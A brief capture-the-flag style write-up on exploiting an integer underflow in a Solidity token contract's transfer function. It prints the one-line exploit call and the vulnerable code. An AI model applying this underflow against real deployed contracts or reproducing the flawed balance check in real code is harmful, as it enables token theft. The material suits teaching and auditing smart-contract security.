Run `await contract.transfer("some other ethereum address","21")` and your connected account will have lot of tokens.
This hack works due to uint underflow in solidity 0.6.0.
The `_value` parameter in `transfer` function is uint
```solidity
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);
  balances[msg.sender] -= _value;
  balances[_to] += _value;
  return true;
}
```
As each address has `20` tokens by default giving value as `21` the balance will
become `20-21` which is `-1` which equals to `2**256-1` in `uint`
